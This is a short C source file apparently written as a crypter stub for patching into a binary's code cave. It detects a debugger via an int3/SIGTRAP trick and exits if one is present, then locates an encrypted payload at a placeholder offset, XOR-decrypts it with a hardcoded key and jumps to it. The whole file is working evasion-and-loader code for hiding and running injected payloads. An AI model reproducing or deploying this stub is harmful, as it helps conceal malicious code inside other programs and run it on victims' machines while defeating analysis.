#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define KEY "\x31\x41\x59"


int active_debugger = 1;

void trap_caught (int sig_num) {
  active_debugger = 0;  
}

int is_debugged () {
  signal(SIGTRAP, trap_caught);
  __asm__("int3");
  return active_debugger;
}

void encrypt (uint8_t* payload, uint8_t* key, int payload_size, int key_size) {
  for (int i = 0; i < payload_size; i++) {
    if (*(key + (i % key_size)) != 0)
      *(payload + i) ^= *(key + (i % key_size));
  }
}

void main() {
  // Exit if debugged.
  if (is_debugged()) {
    printf("No debugging allowed!");
    exit(0);
  }
  
  // Get payload address.
  long int payload_addr;
  __asm__("int3 \n"  // Both int3's to be patched with nop (\x90).
          "int3 \n"
          "lea (%%rip), %%r12 \n"
          "sub $9, %%r12 \n"
          "mov %%r12, %0 \n"
          : "=r" (payload_addr));
  payload_addr += 0x1111;  // 0x1111 to be patched with offset to code cave.

  // Decrypt payload.
  char* key = KEY;
  short int payload_size = 0x2222;  // 0x2222 to be patched with payload size.
  encrypt((uint8_t*)payload_addr, key, payload_size, strlen(KEY));

  // Execute payload.
  __asm__("jmp %0 \n"
          :
          : "r" (payload_addr));
}
